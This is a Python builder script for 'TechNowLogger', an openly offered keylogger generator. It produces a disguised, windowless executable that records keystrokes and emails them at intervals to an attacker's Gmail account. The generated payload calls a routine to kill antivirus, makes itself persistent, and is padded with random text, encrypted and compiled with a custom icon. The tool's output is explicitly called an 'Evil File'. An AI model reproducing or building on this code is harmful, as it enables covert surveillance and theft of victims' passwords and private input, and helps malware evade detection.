#!/usr/bin/env python
import encrypt_code
import argparse
import subprocess
import os
import banners
import shutil
from essential_generators import DocumentGenerator

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.3')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
    

    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()

def check_dependencies():
    print(f"{YELLOW}\n[*] Checking Dependencies...")
    try:
        import mss, essential_generators, PyInstaller, pynput, six, win32gui
        print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
    except Exception as e:
        print(f"[!] Error : {e}")
        try:
            print(f"{YELLOW}[*] Installing All Dependencies From Scratch...\n")
            print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
            import pip
            while 1:
                pip.main(['install', 'mss==4.0.3'])
                pip.main(['install', 'essential_generators==0.9.2'])
                pip.main(['install', 'PyInstaller'])
                pip.main(['install', 'pynput==1.4.4'])
                pip.main(['install', 'six==1.12.0']) 
                pip.main(['install', 'python-xlib==0.25'])
                pip.main(['install', 'win32gui'])
                print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                print(f"{GREEN}\n[+] Dependencies installed correctly ;)\n")
                break
        except:
            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
            quit()

def create_keylogger(file_name, interval, email, password, time_persistent):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")
        file.write("technowlogger.kill_av()\n")        
        file.write(f"technowlogger.become_persistent({time_persistent})\n")
        file.write("technowlogger.start()\n")
        
def obfuscating_payload(file_name):
    gen = DocumentGenerator()
    text = "#" + gen.sentence() 
    with open(file_name, "a") as file:
        file.write(text)

def compile_for_windows(file_name, icon_path):
    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)

def compile_for_linux(file_name, icon_path):
    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)

def del_junk_file(file_name):
    build = os.getcwd() + "\\build"
    file_name = os.getcwd() + f"\\{file_name}"
    pycache = os.getcwd() + "\\__pycache__"
    os.remove(file_name)
    os.remove(file_name + ".spec")    
    shutil.rmtree(build)
    shutil.rmtree(pycache)

def exit_greet():
    try:
        os.system('cls')
    except Exception as e:
        os.system('clear')        
    print(GREEN + '''Thank You for using TechNowLogger, Think Great & Touch The Sky!  \n''' + END)
    quit()
    
if __name__ == '__main__':
    os.system('rm -Rf dist')
    try:
        print(banners.get_banner())
        print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}Website: {GREEN}technowlogy.tk\n")

        arguments = get_arguments()

        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
        print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
        print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
        print(f'   {YELLOW}Log\'s Send Interval:{RED} Every ' + str(arguments.interval) + ' seconds')
        print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out) 
        print(f'   {YELLOW}Icon Path:{RED} ' + arguments.icon)
        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
        
        ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) : ')
    
        if ask.lower() == 'y':
            pass
        else:
            arguments.email = input('\n[?] Type your gmail to receive logs: ')
            arguments.password = input('[?] Type your gmail password: ')
            arguments.interval = int(input('[?] Time interval to send logs; [In Seconds]: '))
            arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))   
            arguments.out = input('[?] Output Evil File Name: ')  
            arguments.icon = input('[?] Icon Path (If Present In This Directory, then just type Name): ')               

        check_dependencies()

        print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")

        create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
        obfuscating_payload(arguments.out)
        
        encrypting_code = encrypt_code.Encrypt()
        encrypting_code.encrypt(arguments.out)

        print(f"{MAGENTA}")

        if arguments.windows:
            compile_for_windows(arguments.out, arguments.icon)

        if arguments.linux:
            compile_for_linux(arguments.out, arguments.icon)

        print(f"\n{YELLOW}[*] Deleting Junk Files...")
        del_junk_file(arguments.out)
        print(f"{GREEN}[+] Junk Files Removed Successfully!")
        
        if os.path.exists(f'dist/{arguments.out}.exe'):
            print(f"\n{GREEN}[+] Generated Successfully!\n")           
            print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")        

        else:
            print(f"\n{RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
            print(f"\n{GREEN}[:D] Please Contact us on https://github.com/Technowlogy-Pushpender/technowlogger\n")                  
    
    except KeyboardInterrupt:        
        exit_greet()
        
    except Exception as e:
        print(f"\n{RED}[!] Error : {e}")
        

    
    